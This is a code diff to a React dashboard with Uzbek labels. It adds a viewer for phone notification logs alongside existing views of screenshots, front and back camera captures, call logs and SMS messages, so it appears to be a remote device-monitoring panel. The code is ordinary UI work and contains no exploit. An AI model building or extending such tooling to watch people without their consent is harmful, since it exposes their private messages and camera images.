@@ -32,6 +32,7 @@ const TYPE_META: Record<string, { icon: string; label: string }> = {
   APP_USAGE:    { icon: '📊', label: 'Foydalanish' },
   CALL_LOGS:    { icon: '📞', label: "Qo'ng'iroqlar" },
   SMS_LOGS:     { icon: '💬', label: 'SMS xabarlar' },
+  NOTIFICATION_LOGS: { icon: '🔔', label: 'Bildirishnomalar' },
 };
 
 function timeAgo(dateStr: string) {
@@ -54,7 +55,7 @@ function isImageType(t: string) {
   return ['SCREENSHOT','CAMERA_FRONT','CAMERA_BACK','SCREEN_SHARE'].includes(t);
 }
 function isJsonType(t: string) {
-  return ['APP_LIST','APP_USAGE','CALL_LOGS','SMS_LOGS'].includes(t);
+  return ['APP_LIST','APP_USAGE','CALL_LOGS','SMS_LOGS','NOTIFICATION_LOGS'].includes(t);
 }
 
 const S = {
@@ -345,6 +346,7 @@ export default function Home() {
     else if (r.type === 'APP_USAGE') setModal({ kind: 'usage', data });
     else if (r.type === 'CALL_LOGS') setModal({ kind: 'calls', data });
     else if (r.type === 'SMS_LOGS') setModal({ kind: 'sms', data });
+    else if (r.type === 'NOTIFICATION_LOGS') setModal({ kind: 'notifications', data });
   } catch (_) {}
   setLoadingId(null); 
   return;
@@ -383,7 +385,8 @@ export default function Home() {
     { type: 'APP_LIST',     label: '📋 Ilovalar' },
     { type: 'APP_USAGE',    label: '📊 Foydalanish' },
     { type: 'CALL_LOGS',    label: "📞 Qo'ng'iroqlar" }, 
-  { type: 'SMS_LOGS',     label: '💬 SMS xabarlar' },  
+  { type: 'SMS_LOGS',     label: '💬 SMS xabarlar' }, 
+    { type: 'NOTIFICATION_LOGS', label: '🔔 Bildirishnomalar' },
     
   ];
 
@@ -683,6 +686,38 @@ export default function Home() {
             <span style={{ fontSize: 10, color: '#64748b' }}>{item.date}</span>
           </div>
           <div style={{ fontSize: 12, color: '#cbd5e1' }}>{item.body}</div>
+        </div>
+      ))}
+    </div>
+  </div>
+)}
+            {/* 🟢 Bildirishnomalar (Notifications) Modali */}
+{modal.kind === 'notifications' && (
+  <div style={{ padding: 24, minWidth: 380, maxWidth: 500 }}>
+    <h3 style={{ fontSize: 16, fontWeight: 700, margin: '0 0 4px', color: '#f1f5f9' }}>🔔 Kelgan Bildirishnomalar</h3>
+    <p style={{ fontSize: 12, color: '#475569', margin: '0 0 16px' }}>Jami: {modal.data.length} ta</p>
+    
+    <div style={{ display: 'grid', gap: 8, maxHeight: '60vh', overflowY: 'auto' }}>
+      {modal.data.map((item, i) => (
+        <div key={i} style={{ padding: '10px 14px', background: 'rgba(255,255,255,0.04)', border: '1px solid rgba(255,255,255,0.06)', borderRadius: 10 }}>
+          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 4 }}>
+            <span style={{ fontSize: 11, fontWeight: 700, color: '#f59e0b', textTransform: 'uppercase', letterSpacing: '0.5px' }}>
+              {item.appName || item.packageName}
+            </span>
+            {item.postTime && (
+              <span style={{ fontSize: 10, color: '#64748b' }}>{item.postTime}</span>
+            )}
+          </div>
+          
+          {item.title && (
+            <div style={{ fontSize: 13, fontWeight: 600, color: '#e2e8f0', marginBottom: 2 }}>
+              {item.title}
+            </div>
+          )}
+          
+          <div style={{ fontSize: 12, color: '#94a3b8', lineHeight: '1.4' }}>
+            {item.text || 'Xabar matni yo\'q'}
+          </div>
         </div>
       ))}
     </div>
